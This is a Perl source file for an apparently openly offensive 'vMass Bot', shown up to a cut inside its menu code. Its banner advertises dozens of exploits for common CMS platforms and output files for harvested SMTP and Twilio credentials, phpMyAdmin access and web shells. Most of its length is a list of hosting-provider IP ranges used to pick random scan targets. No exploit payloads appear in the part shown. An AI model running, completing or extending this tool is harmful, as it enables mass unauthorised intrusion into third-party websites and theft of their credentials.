#!/usr/bin/perl
use if $^O eq "MSWin32", Win32::Console::ANSI;
use warnings;
use Net::IP;
use Net::DNS::Resolver;
use LWP::UserAgent;
use HTTP::Request::Common;
use WWW::Mechanize;
use Term::ANSIColor;

my $res  = Net::DNS::Resolver->new;
my $ua   = LWP::UserAgent->new;
my $mech = WWW::Mechanize->new();
if   ( $^O =~ /MSWin32/ ) { system("cls"); }
else                      { system("clear"); }

#----------->  Main Program  <-----------#
sub CMS_BANNER {

    system("title vMASS BOT 1.2");

    if   ( $^O =~ /MSWin32/ ) { system("cls"); }
    else                      { system("clear"); }

        
    #here art
    if   ( $^O =~ /MSWin32/ ){
        print "os: Windows\n";
        print color('bold red');
    print q(
                __   __/\/\   __ _ ___ ___  | |__   ___ | |_ 
                \ \ / /    \ / _` / __/ __| | '_ \ / _ \| __|
                 \ V / /\/\ \ (_| \__ \__ \ | |_) | (_) | |_ 
                  \_/\/    \/\__,_|___/___/ |_.__/ \___/ \__|
                                                 FREE VERSION
                                Coded by Dpr
                          https://github.com/touchmycrazyredhat
                             https://t.me/
                             
                             
                          vMass Bot - Version v1.2
                         
    LAST UPDATE : 08-29-22 ~ LAST EXPLOIT ADDED : CVE v2.3.5- Blind SQLi Magento
    
);
print color('reset');
    }else{
    print color('bold yellow');
    print( "
          ██╗░░░██╗███╗░░░███╗░█████╗░░██████╗░██████╗  ██████╗░░█████╗░████████╗
          ██║░░░██║████╗░████║██╔══██╗██╔════╝██╔════╝  ██╔══██╗██╔══██╗╚══██╔══╝
          ╚██╗░██╔╝██╔████╔██║███████║╚█████╗░╚█████╗░  ██████╦╝██║░░██║░░░██║░░░
          ░╚████╔╝░██║╚██╔╝██║██╔══██║░╚═══██╗░╚═══██╗  ██╔══██╗██║░░██║░░░██║░░░
          ░░╚██╔╝░░██║░╚═╝░██║██║░░██║██████╔╝██████╔╝  ██████╦╝╚█████╔╝░░░██║░░░
          ░░░╚═╝░░░╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚═════╝░  ╚═════╝░░╚════╝░░░░╚═╝░░░            
                                                                     FREE VERSION  

                                       Coded by Dpr
                                       Modded by touchmycrazyredhat                                                      
                                    https://github.com/touchmycrazyredhat 
                                    https://t.me/dpr52
" );
    print color('reset');
    print color('bold blue');
    print q(
                                 vMass Bot - Version v1.2
    );
    print color('reset');
    print q(
        LAST UPDATE : 08-29-22 ~ LAST EXPLOIT ADDED : CVE v2.3.5- Blind SQLi Magento

          ╔════════════════╦═════════════╦═════════════╦════════════╦════════════╗
          ║      CMS       ║  Wordpress  ║   Joomla    ║ Prestashop ║  Magento   ║
          ╠════════════════╬═════════════╬═════════════╬════════════╬════════════╣
          ║ EXPLOITS COUNT ║      38     ║     19      ║     38     ║     13     ║
          ╚════════════════╩═════════════╩═════════════╩════════════╩════════════╝
                
                RANDOM HOSTING RANGES : 1030+ ~ Unique IPs Included : 50M+

);
}

}

#Init text files
sub GenerateText {
    my $output = 'IPs.txt';
    unless ( -e $output ) {
        open my $fc, ">", $output;
        close $fc;
    }

    my $good = 'LiveIPs.txt';
    unless ( -e $good ) {
        open my $fc, ">", $good;
        close $fc;
    }

    my $bad = 'badIPs.txt';
    unless ( -e $bad ) {
        open my $fc, ">", $bad;
        close $fc;
    }

    my $env = 'envIPs.txt';
    unless ( -e $env ) {
        open my $fc, ">", $env;
        close $fc;
    }
    my $other = 'results/OtherTools.txt';
    unless ( -e $other ) {
        open my $fc, ">", $other;
        close $fc;
    }
    my $smtp = 'results/SMTP.txt';
    unless ( -e $smtp ) {
        open my $fc, ">", $smtp;
        close $fc;
    }
    my $twilio = 'results/TWILIO.txt';
    unless ( -e $twilio ) {
        open my $fc, ">", $twilio;
        close $fc;
    }
    my $PHPMYADMIN = 'results/PHPMYADMIN.txt';
    unless ( -e $PHPMYADMIN ) {
        open my $fc, ">", $PHPMYADMIN;
        close $fc;
    }
    my $shell = 'results/SHELLS.txt';
    unless ( -e $shell ) {
        open my $fc, ">", $shell;
        close $fc;
    }

}

my @hosting_ranges = (
    "192.185.0.0/24",   "192.185.1.0/24",
    "192.185.2.0/24",   "192.185.3.0/24",
    "192.185.4.0/24",   "192.185.5.0/24",
    "192.185.6.0/24",   "192.185.7.0/24",
    "192.185.8.0/24",   "192.185.9.0/24",
    "192.185.10.0/24",  "192.185.11.0/24",
    "192.185.12.0/24",  "192.185.13.0/24",
    "192.185.14.0/24",  "192.185.15.0/24",
    "192.185.16.0/24",  "192.185.17.0/24",
    "192.185.18.0/24",  "192.185.19.0/24",
    "192.185.20.0/24",  "192.185.21.0/24",
    "192.185.22.0/24",  "192.185.23.0/24",
    "192.185.24.0/24",  "192.185.25.0/24",
    "192.185.26.0/24",  "192.185.27.0/24",
    "192.185.28.0/24",  "192.185.29.0/24",
    "192.185.30.0/24",  "192.185.31.0/24",
    "192.185.32.0/24",  "192.185.33.0/24",
    "192.185.34.0/24",  "192.185.35.0/24",
    "192.185.36.0/24",  "192.185.37.0/24",
    "192.185.38.0/24",  "192.185.39.0/24",
    "192.185.40.0/24",  "192.185.41.0/24",
    "192.185.42.0/24",  "192.185.43.0/24",
    "192.185.44.0/24",  "192.185.45.0/24",
    "192.185.46.0/24",  "192.185.47.0/24",
    "192.185.48.0/24",  "192.185.49.0/24",
    "192.185.50.0/24",  "192.185.51.0/24",
    "192.185.52.0/24",  "192.185.53.0/24",
    "192.185.54.0/24",  "192.185.55.0/24",
    "192.185.56.0/24",  "192.185.57.0/24",
    "192.185.58.0/24",  "192.185.59.0/24",
    "192.185.60.0/24",  "192.185.61.0/24",
    "192.185.62.0/24",  "192.185.63.0/24",
    "103.111.33.0/24",  "107.182.225.0/24",
    "107.182.226.0/24", "107.182.230.0/23",
    "107.182.236.0/24", "107.182.237.0/24",
    "172.98.69.0/24",   "173.239.210.0/24",
    "173.244.198.0/24", "173.244.200.0/23",
    "173.244.202.0/24", "173.244.217.0/24",
    "173.244.222.0/23", "174.127.120.0/21",
    "174.127.70.0/24",  "174.127.91.0/24",
    "191.101.174.0/24", "192.142.140.0/23",
    "192.142.171.0/24", "196.52.2.0/24",
    "196.52.70.0/24",   "198.145.239.0/24",
    "199.188.238.0/24", "204.14.72.0/24",
    "204.14.73.0/24",   "206.190.154.0/24",
    "206.217.196.0/22", "209.126.88.0/24",
    "209.95.50.0/23",   "209.95.52.0/24",
    "212.60.12.0/24",   "216.150.78.0/24",
    "216.235.87.0/24",  "45.56.196.0/24",
    "45.56.197.0/24",   "45.56.198.0/24",
    "45.67.141.0/24",   "50.31.240.0/23",
    "50.31.252.0/22",   "63.141.48.0/24",
    "67.213.210.0/24",  "67.213.212.0/24",
    "69.36.182.0/24",   "69.36.183.0/24",
    "98.158.184.0/21",  "98.158.190.0/24",
    "100.42.48.0/24",   "100.42.49.0/24",
    "100.42.50.0/24",   "100.42.51.0/24",
    "100.42.52.0/24",   "100.42.53.0/24",
    "100.42.54.0/24",   "100.42.55.0/24",
    "100.42.58.0/24",   "100.42.59.0/24",
    "100.42.60.0/24",   "100.42.61.0/24",
    "100.42.62.0/24",   "100.42.63.0/24",
    "104.152.64.0/24",  "104.152.65.0/24",
    "104.152.66.0/24",  "104.152.67.0/24",
    "104.152.68.0/24",  "104.152.69.0/24",
    "104.152.70.0/24",  "104.152.71.0/24",
    "104.171.0.0/24",   "104.171.10.0/24",
    "104.171.1.0/24",   "104.171.11.0/24",
    "104.171.15.0/24",  "104.171.2.0/24",
    "104.171.3.0/24",   "104.171.4.0/24",
    "104.171.5.0/24",   "104.171.6.0/24",
    "104.171.7.0/24",   "104.171.8.0/24",
    "104.254.99.0/24",  "108.167.128.0/22",
    "108.167.132.0/22", "108.167.136.0/22",
    "108.167.140.0/22", "108.167.144.0/20",
    "108.167.163.0/24", "108.167.164.0/22",
    "108.167.168.0/22", "108.167.172.0/22",
    "108.167.176.0/22", "108.167.184.0/22",
    "108.167.188.0/22", "108.175.144.0/24",
    "108.175.145.0/24", "108.175.146.0/24",
    "108.175.148.0/24", "108.175.149.0/24",
    "108.175.151.0/24", "108.175.153.0/24",
    "108.175.154.0/24", "108.175.155.0/24",
    "108.175.156.0/24", "108.175.158.0/24",
    "108.175.159.0/24", "108.179.192.0/22",
    "108.179.196.0/22", "108.179.200.0/22",
    "108.179.204.0/22", "108.179.208.0/20",
    "108.179.224.0/22", "108.179.228.0/22",
    "108.179.236.0/22", "108.179.240.0/21",
    "108.179.248.0/22", "108.179.252.0/22",
    "142.4.0.0/19",     "143.95.192.0/20",
    "162.144.0.0/16",   "162.144.10.0/24",
    "162.144.191.0/24", "162.144.248.0/21",
    "162.144.50.0/24",  "162.210.70.0/24",
    "162.210.71.0/24",  "162.214.0.0/15",
    "162.214.135.0/24", "162.214.136.0/21",
    "162.214.152.0/21", "162.214.249.0/24",
    "162.214.41.0/24",  "162.214.44.0/22",
    "162.214.60.0/22",  "162.214.64.0/21",
    "162.214.72.0/21",  "162.214.80.0/24",
    "162.214.96.0/21",  "162.215.192.0/24",
    "162.215.194.0/23", "162.215.226.0/24",
    "162.215.230.0/24", "162.215.231.0/24",
    "162.215.232.0/24", "162.215.240.0/23",
    "162.215.252.0/23", "162.215.253.0/24",
    "100.20.0.0/14",    "103.107.56.0/24",
    "103.119.213.0/24", "103.124.134.0/24",
    "103.124.135.0/24", "103.127.75.0/24",
    "103.136.10.0/24",  "103.143.45.0/24",
    "103.145.182.0/24", "103.145.192.0/24",
    "103.147.71.0/24",  "103.149.112.0/24",
    "103.150.161.0/24", "103.150.47.0/24",
    "103.151.192.0/24", "103.151.193.0/24",
    "103.151.39.0/24",  "103.152.248.0/24",
    "103.16.101.0/24",  "103.161.77.0/24",
    "103.165.160.0/24", "103.16.56.0/24",
    "103.16.59.0/24",   "103.166.180.0/24",
    "103.167.153.0/24", "103.168.156.0/24",
    "103.168.157.0/24", "103.168.209.0/24",
    "103.175.106.0/23", "103.175.120.0/23",
    "103.179.36.0/24",  "103.179.37.0/24",
    "103.181.194.0/24", "103.181.240.0/24",
    "103.182.250.0/24", "103.182.251.0/24",
    "103.187.14.0/24",  "103.188.89.0/24",
    "103.190.96.0/23",  "103.19.244.0/22",
    "103.195.60.0/24",  "103.195.61.0/24",
    "103.195.62.0/24",  "103.195.63.0/24",
    "103.196.32.0/24",  "103.211.172.0/24",
    "103.229.10.0/24",  "103.229.8.0/24",
    "103.229.9.0/24",   "103.235.88.0/24",
    "103.23.68.0/23",   "103.238.120.0/24",
    "103.246.148.0/23", "103.246.150.0/23",
    "103.246.251.0/24", "103.43.38.0/23",
    "103.4.8.0/21",     "103.53.55.0/24",
    "103.58.192.0/24",  "103.70.20.0/22",
    "103.70.49.0/24",   "103.71.98.0/24",
    "103.80.6.0/24",    "103.8.172.0/22",
    "103.85.213.0/24",  "104.171.198.0/24",
    "104.171.199.0/24", "104.192.136.0/24",
    "104.192.137.0/24", "104.192.138.0/24",
    "104.192.140.0/24", "104.192.141.0/24",
    "104.192.143.0/24", "104.193.186.0/24",
    "104.193.205.0/24", "104.193.207.0/24",
    "104.207.162.0/24", "104.207.170.0/24",
    "104.207.171.0/24", "104.207.172.0/24",
    "104.207.173.0/24", "104.207.174.0/24",
    "104.218.202.0/24", "104.232.45.0/24",
    "104.238.244.0/24", "104.238.245.0/24",
    "104.238.247.0/24", "104.249.160.0/24",
    "104.249.161.0/24", "104.255.56.0/24",
    "104.255.57.0/24",  "104.255.58.0/24",
    "104.255.59.0/24",  "104.255.60.0/24",
    "104.36.33.0/24",   "107.162.252.0/24",
    "108.128.0.0/13",   "108.136.0.0/15",
    "108.138.0.0/21",   "108.138.100.0/23",
    "109.190.0.0/16",   "151.127.0.0/16",
    "109.106.240.0/21", "109.106.248.0/22",
    "109.106.252.0/22", "141.136.33.0/24",
    "141.136.34.0/24",  "141.136.35.0/24",
    "141.136.36.0/24",  "141.136.39.0/24",
    "141.136.41.0/24",  "141.136.42.0/24",
    "141.136.43.0/24",  "141.136.44.0/24",
    "141.136.45.0/24",  "141.136.46.0/24",
    "141.136.47.0/24",  "145.14.146.0/23",
    "145.14.148.0/22",  "145.14.152.0/22",
    "145.14.156.0/22",  "149.62.37.0/24",
    "149.62.39.0/24",   "151.106.112.0/20",
    "151.106.96.0/20",  "153.92.10.0/24",
    "153.92.1.0/24",    "153.92.11.0/24",
    "153.92.12.0/24",   "153.92.13.0/24",
    "153.92.14.0/24",   "153.92.15.0/24",
    "153.92.2.0/24",    "153.92.208.0/22",
    "153.92.212.0/22",  "153.92.216.0/21",
    "153.92.3.0/24",    "153.92.4.0/23",
    "153.92.6.0/24",    "153.92.7.0/24",
    "153.92.8.0/24",    "153.92.9.0/24",
    "156.67.208.0/20",  "156.67.64.0/20",
    "160.238.36.0/24",  "179.61.189.0/24",
    "185.166.188.0/24", "185.187.240.0/23",
    "185.201.10.0/23",  "185.201.8.0/23",
    "185.206.160.0/23", "185.206.162.0/23",
    "185.210.144.0/22", "185.211.4.0/24",
    "185.211.7.0/24",   "185.212.70.0/23",
    "185.213.81.0/24",  "185.214.124.0/23",
    "185.214.126.0/23", "185.214.132.0/23",
    "185.220.22.0/24",  "185.224.136.0/22",
    "185.229.112.0/23", "185.229.114.0/23",
    "185.229.118.0/24", "185.232.14.0/24",
    "185.237.144.0/23", "185.237.146.0/23",
    "185.239.210.0/24", "185.245.180.0/24",
    "185.249.224.0/24", "185.28.20.0/24",
    "185.28.21.0/24",   "185.28.22.0/24",
    "185.28.23.0/24",   "185.77.96.0/24",
    "185.77.97.0/24",   "191.101.0.0/24",
    "191.101.1.0/24",   "191.101.12.0/22",
    "191.101.2.0/24",   "191.101.228.0/24",
    "191.101.230.0/24", "191.101.231.0/24",
    "191.101.3.0/24",   "191.96.1.0/24",
    "193.160.119.0/24", "193.160.64.0/23",
    "193.160.66.0/23",  "193.168.192.0/23",
    "193.168.194.0/23", "193.42.136.0/24",
    "193.42.137.0/24",  "193.43.134.0/24",
    "193.46.196.0/22",  "194.11.154.0/23",
    "194.11.214.0/23",  "194.113.64.0/24",
    "194.163.32.0/21",  "194.163.40.0/22",
    "194.163.44.0/22",  "194.195.84.0/24",
    "100.20.0.0/14",    "103.107.56.0/24",
    "103.119.213.0/24", "103.124.134.0/24",
    "103.124.135.0/24", "103.127.75.0/24",
    "103.136.10.0/24",  "103.143.45.0/24",
    "103.145.182.0/24", "103.145.192.0/24",
    "103.147.71.0/24",  "103.149.112.0/24",
    "103.150.161.0/24", "103.150.47.0/24",
    "103.151.192.0/24", "103.151.193.0/24",
    "103.151.39.0/24",  "103.152.248.0/24",
    "103.16.101.0/24",  "103.161.77.0/24",
    "103.165.160.0/24", "103.16.56.0/24",
    "103.16.59.0/24",   "103.166.180.0/24",
    "103.167.153.0/24", "103.168.156.0/24",
    "103.168.157.0/24", "103.168.209.0/24",
    "103.175.106.0/23", "103.175.120.0/23",
    "103.179.36.0/24",  "103.179.37.0/24",
    "103.181.194.0/24", "103.181.240.0/24",
    "103.182.250.0/24", "103.182.251.0/24",
    "103.187.14.0/24",  "103.188.89.0/24",
    "103.190.96.0/23",  "103.19.244.0/22",
    "103.195.60.0/24",  "103.195.61.0/24",
    "103.195.62.0/24",  "103.195.63.0/24",
    "103.196.32.0/24",  "103.211.172.0/24",
    "103.229.10.0/24",  "103.229.8.0/24",
    "103.229.9.0/24",   "103.235.88.0/24",
    "103.23.68.0/23",   "103.238.120.0/24",
    "103.246.148.0/23", "103.246.150.0/23",
    "103.246.251.0/24", "103.43.38.0/23",
    "103.4.8.0/21",     "103.53.55.0/24",
    "103.58.192.0/24",  "103.70.20.0/22",
    "103.70.49.0/24",   "103.71.98.0/24",
    "103.80.6.0/24",    "103.8.172.0/22",
    "103.85.213.0/24",  "104.171.198.0/24",
    "104.171.199.0/24", "104.192.136.0/24",
    "104.192.137.0/24", "104.192.138.0/24",
    "104.192.140.0/24", "104.192.141.0/24",
    "104.192.143.0/24", "104.193.186.0/24",
    "104.193.205.0/24", "104.193.207.0/24",
    "104.207.162.0/24", "104.207.170.0/24",
    "104.207.171.0/24", "104.207.172.0/24",
    "104.207.173.0/24", "104.207.174.0/24",
    "104.218.202.0/24", "104.232.45.0/24",
    "104.238.244.0/24", "104.238.245.0/24",
    "104.238.247.0/24", "104.249.160.0/24",
    "104.249.161.0/24", "104.255.56.0/24",
    "104.255.57.0/24",  "104.255.58.0/24",
    "104.255.59.0/24",  "104.255.60.0/24",
    "104.36.33.0/24",   "107.162.252.0/24",
    "108.128.0.0/13",   "108.136.0.0/15",
    "108.138.0.0/21",   "108.138.100.0/23",
    "121.162.175.0/24", "1.232.49.0/24",
    "138.108.104.0/23", "138.108.106.0/23",
    "138.108.116.0/24", "138.108.136.0/24",
    "138.108.137.0/24", "138.108.140.0/22",
    "138.108.141.0/24", "138.108.143.0/24",
    "138.108.144.0/24", "138.108.154.0/24",
    "138.108.155.0/24", "138.108.157.0/24",
    "138.108.162.0/24", "138.108.163.0/24",
    "138.108.3.0/24",   "138.108.32.0/24",
    "138.108.33.0/24",  "138.108.36.0/24",
    "138.108.38.0/24",  "138.108.96.0/21",
    "203.11.170.0/24",  "203.11.171.0/24",
    "203.11.172.0/24",  "203.11.173.0/24",
    "203.11.174.0/24",  "206.51.13.0/24",
    "206.51.15.0/24",   "8.28.183.0/24",
    "103.94.240.0/22",  "103.96.100.0/24",
    "103.96.101.0/24",  "103.96.102.0/24",
    "103.96.103.0/24",  "107.150.146.0/23",
    "107.6.104.0/22",   "107.6.108.0/22",
    "107.6.128.0/18",   "107.6.136.0/24",
    "107.6.140.0/22",   "107.6.150.0/23",
    "107.6.152.0/22",   "107.6.156.0/23",
    "107.6.160.0/20",   "107.6.176.0/21",
    "107.6.184.0/22",   "107.6.64.0/21",
    "107.6.80.0/21",    "108.163.192.0/18",
    "108.163.200.0/24", "108.163.206.0/24",
    "108.163.236.0/22", "108.178.0.0/19",
    "108.178.12.0/24",  "108.178.30.0/24",
    "108.178.32.0/20",  "108.178.48.0/20",
    "108.178.48.0/22",  "108.178.54.0/23",
    "147.75.129.0/24",  "162.253.224.0/22",
    "172.94.45.0/24",   "172.96.184.0/24",
    "172.96.186.0/24",  "172.96.187.0/24",
    "172.96.188.0/24",  "173.231.128.0/18",
    "173.231.176.0/22", "173.231.180.0/23",
    "173.236.0.0/17",   "173.236.0.0/18",
    "173.236.11.0/24",  "173.236.16.0/24",
    "173.236.2.0/24",   "173.236.4.0/23",
    "173.236.64.0/23",  "173.236.66.0/24",
    "173.236.67.0/24",  "173.236.68.0/22",
    "173.236.69.0/24",  "173.236.7.0/24",
    "173.236.72.0/21",  "173.236.72.0/22",
    "173.236.80.0/20",  "173.236.8.0/23",
    "173.236.91.0/24",  "173.236.96.0/19",
    "184.154.0.0/16",   "184.154.0.0/24",
    "184.154.100.0/24", "184.154.1.0/24",
    "184.154.120.0/24", "184.154.14.0/24",
    "184.154.152.0/24", "184.154.155.0/24",
    "184.154.160.0/24", "184.154.168.0/24",
    "184.154.191.0/24", "184.154.22.0/24",
    "184.154.224.0/20", "184.154.240.0/21",
    "184.154.46.0/24",  "184.154.63.0/24",
    "184.154.70.0/24",  "184.154.81.0/24",
    "185.126.97.0/24",  "185.195.12.0/23",
    "185.197.128.0/24", "185.197.129.0/24",
    "185.197.130.0/24", "185.197.131.0/24",
    "192.170.144.0/21", "192.170.144.0/22",
    "192.170.148.0/22", "198.143.128.0/18",
    "198.143.152.0/24", "198.143.160.0/20",
    "198.143.164.0/24", "198.143.166.0/24",
    "198.143.170.0/24", "198.143.172.0/22",
    "198.143.176.0/20", "198.143.184.0/21",
    "198.20.64.0/18",   "198.20.72.0/21",
    "198.20.80.0/21",   "198.20.88.0/22",
    "198.20.96.0/19",   "198.91.80.0/20",
    "103.195.184.0/22", "103.195.184.0/24",
    "103.195.186.0/23", "103.195.186.0/24",
    "103.195.187.0/24", "103.211.216.0/22",
    "103.21.58.0/23",   "103.224.22.0/23",
    "103.224.22.0/24",  "103.224.23.0/24",
    "103.50.160.0/22",  "103.53.40.0/22",
    "103.76.228.0/22",  "103.88.188.0/22",
    "111.118.212.0/22", "116.206.104.0/23",
    "116.206.106.0/23", "116.206.106.0/24",
    "116.206.107.0/24", "119.18.48.0/20",
    "119.18.49.0/24",   "119.18.54.0/24",
    "137.59.148.0/22",  "137.59.148.0/24",
    "137.59.149.0/24",  "137.59.150.0/24",
    "137.59.151.0/24",  "202.155.178.0/23",
    "203.13.40.0/24",   "216.10.240.0/20",
    "216.10.240.0/23",  "216.10.240.0/24",
    "216.10.254.0/23",  "43.225.52.0/22",
    "45.113.120.0/22",  "45.113.120.0/24",
    "45.113.122.0/23",  "45.113.122.0/24",
    "45.113.123.0/24",  "5.100.152.0/22",
    "65.254.64.0/19",   "65.254.64.0/22",
    "65.254.68.0/22",   "65.254.70.0/24",
    "65.254.72.0/22",   "65.254.76.0/24",
    "198.181.229.0/24", "208.73.136.0/21",
    "208.73.142.0/24",  "103.1.172.0/22",
    "103.44.220.0/24",  "103.87.189.0/24",
    "103.87.190.0/23",  "104.238.100.0/22",
    "104.238.104.0/22", "104.238.112.0/22",
    "104.238.116.0/22", "104.238.124.0/22",
    "104.238.64.0/18",  "104.238.64.0/19",
    "104.238.64.0/22",  "104.238.64.0/24",
    "104.238.72.0/22",  "104.238.76.0/22",
    "104.238.80.0/22",  "104.238.84.0/22",
    "104.238.88.0/22",  "104.238.92.0/22",
    "104.238.96.0/22",  "107.180.0.0/17",
    "107.180.0.0/18",   "107.180.100.0/22",
    "107.180.104.0/22", "107.180.108.0/22",
    "107.180.112.0/21", "107.180.120.0/21",
    "107.180.64.0/19",  "118.139.160.0/19",
    "118.139.160.0/21", "118.139.176.0/21",
    "132.148.0.0/16",   "132.148.0.0/22",
    "132.148.12.0/22",  "132.148.16.0/20",
    "132.148.16.0/22",  "132.148.164.0/22",
    "132.148.176.0/21", "132.148.184.0/21",
    "132.148.192.0/20", "132.148.20.0/22",
    "132.148.216.0/21", "132.148.24.0/22",
    "132.148.248.0/21", "132.148.32.0/21",
    "132.148.4.0/22",   "132.148.8.0/22",
    "132.148.92.0/24",  "148.66.128.0/19",
    "148.66.128.0/22",  "148.66.136.0/22",
    "148.66.140.0/22",  "148.66.144.0/21",
    "148.72.0.0/17",    "148.72.0.0/21",
    "148.72.104.0/21",  "148.72.12.0/22",
    "148.72.16.0/22",   "148.72.204.0/22",
    "148.72.204.0/24",  "148.72.208.0/21",
    "148.72.220.0/22",  "148.72.224.0/19",
    "148.72.224.0/20",  "148.72.240.0/22",
    "148.72.24.0/21",   "148.72.244.0/22",
    "148.72.32.0/21",   "148.72.32.0/23",
    "148.72.34.0/24",   "148.72.36.0/24",
    "148.72.44.0/22",   "148.72.48.0/21",
    "148.72.56.0/21",   "148.72.68.0/22",
    "148.72.72.0/21",   "148.72.8.0/22",
    "148.72.88.0/22",   "148.72.96.0/21",
    "160.153.32.0/19",  "160.153.64.0/18",
    "160.153.64.0/19",  "160.153.96.0/19",
    "166.62.0.0/19",    "166.62.0.0/22",
    "166.62.100.0/22",  "166.62.112.0/20",
    "166.62.116.0/22",  "166.62.120.0/22",
    "166.62.12.0/22",   "166.62.16.0/22",
    "166.62.20.0/22",   "166.62.24.0/22",
    "166.62.28.0/22",   "166.62.32.0/19",
    "166.62.32.0/22",   "166.62.36.0/22",
    "166.62.40.0/22",   "166.62.4.0/22",
    "166.62.44.0/22",   "100.43.14.0/24",
    "103.228.98.0/24",  "103.70.51.0/24",
    "104.232.42.0/24",  "107.191.73.0/24",
    "109.205.152.0/22", "109.205.156.0/24",
    "109.236.193.0/24", "109.236.194.0/24",
    "113.29.28.0/24",   "113.29.78.0/24",
    "113.29.91.0/24",   "128.191.238.0/24",
    "128.224.248.0/22", "128.224.251.0/24",
    "129.192.169.0/24", "129.192.183.0/24",
    "131.119.0.0/16",   "132.174.170.0/24",
    "132.174.174.0/24", "132.174.175.0/24",
    "132.174.179.0/24", "137.236.48.0/24",
    "138.108.52.0/24",  "138.207.0.0/24",
    "138.207.1.0/24",   "139.64.248.0/24",
    "139.69.0.0/16",    "142.202.22.0/24",
    "143.223.177.0/24", "143.223.4.0/24",
    "143.61.147.0/24",  "144.172.12.0/22",
    "148.165.0.0/18",   "148.165.100.0/23",
    "148.165.102.0/23", "148.165.128.0/17",
    "148.165.64.0/18",  "149.117.129.0/24",
    "149.117.146.0/24", "149.117.159.0/24",
    "149.117.18.0/24",  "149.117.19.0/24",
    "149.117.24.0/24",  "149.117.25.0/24",
    "149.117.30.0/24",  "149.117.52.0/24",
    "149.117.53.0/24",  "149.117.54.0/24",
    "149.254.251.0/24", "149.37.1.0/24",
    "149.37.200.0/24",  "152.50.128.0/17",
    "155.65.251.0/24",  "156.139.0.0/16",
    "159.127.32.0/24",  "159.246.50.0/24",
    "159.246.51.0/24",  "159.63.163.0/24",
    "159.63.179.0/24",  "159.63.180.0/24",
    "161.12.16.0/22",   "161.181.48.0/24",
    "161.199.156.0/24", "162.18.92.0/24",
    "162.18.94.0/24",   "162.18.95.0/24",
    "162.246.96.0/24",  "162.97.152.0/21",
    "162.97.220.0/23",  "163.123.197.0/24",
    "163.5.164.0/24",   "165.158.0.0/16",
    "165.236.128.0/21", "165.236.136.0/21",
    "165.236.144.0/20", "165.236.176.0/21",
    "165.236.64.0/19",  "165.236.96.0/21",
    "166.90.0.0/16",    "167.136.238.0/24",
    "167.242.233.0/24", "167.246.59.0/24",
    "167.75.0.0/18",    "167.8.5.0/24",
    "168.215.128.0/24", "168.215.65.0/24",
    "169.153.176.0/24", "169.153.177.0/24",
    "169.159.192.0/20", "169.159.192.0/21",
    "169.159.200.0/21", "169.159.201.0/24",
    "171.154.2.0/24",   "171.162.105.0/24",
    "172.110.186.0/23", "172.84.80.0/22",
    "173.195.72.0/24",  "173.205.204.0/24",
    "173.226.11.0/24",  "103.195.184.0/22",
    "103.195.184.0/24", "103.195.186.0/23",
    "103.195.186.0/24", "103.195.187.0/24",
    "103.211.216.0/22", "103.21.58.0/23",
    "103.224.22.0/23",  "103.224.22.0/24",
    "103.224.23.0/24",  "103.50.160.0/22",
    "103.53.40.0/22",   "103.76.228.0/22",
    "103.88.188.0/22",  "111.118.212.0/22",
    "116.206.104.0/23", "116.206.106.0/23",
    "116.206.106.0/24", "116.206.107.0/24",
    "119.18.48.0/20",   "119.18.49.0/24",
    "119.18.54.0/24",   "137.59.148.0/22",
    "137.59.148.0/24",  "137.59.149.0/24",
    "137.59.150.0/24",  "137.59.151.0/24",
    "202.155.178.0/23", "203.13.40.0/24",
    "216.10.240.0/20",  "216.10.240.0/23",
    "216.10.240.0/24",  "216.10.254.0/23",
    "43.225.52.0/22",   "45.113.120.0/22",
    "45.113.120.0/24",  "45.113.122.0/23",
    "45.113.122.0/24",  "45.113.123.0/24",
    "5.100.152.0/22",   "65.254.64.0/19",
    "65.254.64.0/22",   "65.254.68.0/22",
    "65.254.70.0/24",   "65.254.72.0/22",
    "65.254.76.0/24",   "103.120.128.0/23",
    "103.134.74.0/23",  "103.205.24.0/22",
    "103.212.80.0/23",  "103.212.82.0/24",
    "103.243.124.0/23", "103.243.126.0/23",
    "103.54.143.0/24",  "104.153.80.0/24",
    "104.153.83.0/24",  "104.164.151.0/24",
    "104.164.155.0/24", "104.164.180.0/24",
    "104.164.184.0/24", "104.164.206.0/24",
    "104.164.210.0/24", "104.164.33.0/24",
    "104.165.101.0/24", "104.165.107.0/24",
    "104.165.109.0/24", "104.165.114.0/24",
    "104.165.120.0/24", "104.165.12.0/24",
    "104.165.134.0/24", "104.165.144.0/24",
    "104.165.195.0/24", "104.165.236.0/24",
    "104.165.243.0/24", "104.165.253.0/24",
    "104.165.29.0/24",  "104.165.3.0/24",
    "104.165.31.0/24",  "104.165.73.0/24",
    "104.165.78.0/24",  "104.165.81.0/24",
    "104.165.83.0/24",  "104.165.91.0/24",
    "104.167.0.0/24",   "104.167.10.0/24",
    "104.167.229.0/24", "104.171.22.0/24",
    "104.171.23.0/24",  "104.171.24.0/21",
    "104.218.195.0/24", "104.224.54.0/24",
    "104.224.55.0/24",  "104.233.0.0/21",
    "104.233.12.0/22",  "104.233.16.0/22",
    "104.234.100.0/24", "104.234.106.0/24",
    "104.234.11.0/24",  "104.234.12.0/24",
    "104.234.130.0/23", "104.234.13.0/24",
    "104.234.132.0/22", "104.234.15.0/24",
    "104.234.16.0/24",  "104.234.162.0/23",
    "104.234.164.0/23", "104.234.167.0/24",
    "104.234.17.0/24",  "104.234.172.0/22",
    "104.234.180.0/22", "104.234.184.0/24",
    "104.234.185.0/24", "104.234.186.0/24",
    "104.234.187.0/24", "104.234.188.0/22",
    "104.234.19.0/24",  "104.234.21.0/24",
    "104.234.23.0/24",  "104.234.232.0/22",
    "104.234.237.0/24", "104.234.238.0/24",
    "104.234.239.0/24", "104.234.240.0/24",
    "104.234.241.0/24", "104.234.242.0/24",
    "104.234.243.0/24", "104.234.244.0/24",
    "104.234.245.0/24", "104.234.246.0/24",
    "104.234.247.0/24", "104.234.25.0/24",
    "104.234.27.0/24",  "104.234.28.0/24",
    "104.234.29.0/24",  "104.234.31.0/24",
    "104.234.33.0/24",  "104.234.35.0/24",
    "104.234.40.0/24",  "104.234.4.0/24",
    "104.234.41.0/24",  "104.234.43.0/24",
    "104.234.44.0/24",  "104.234.45.0/24",
    "104.234.47.0/24",  "104.234.49.0/24",
    "104.234.5.0/24",
);

sub GenerateHostingRange {
    print "Random Range: ";
    my $rnd   = int( rand(1037) );
    my $range = @hosting_ranges[$rnd];
    print $range, "\n";
    print "1: Generate from this range\n";
    print "2: Pick another range\n";
    print "\n";
    print "0: Back to Menu\n";
    print "> ";
    my $choice = <STDIN>;
    chomp $choice;

    if ( $choice eq '0' ) {
        Menu();
    }
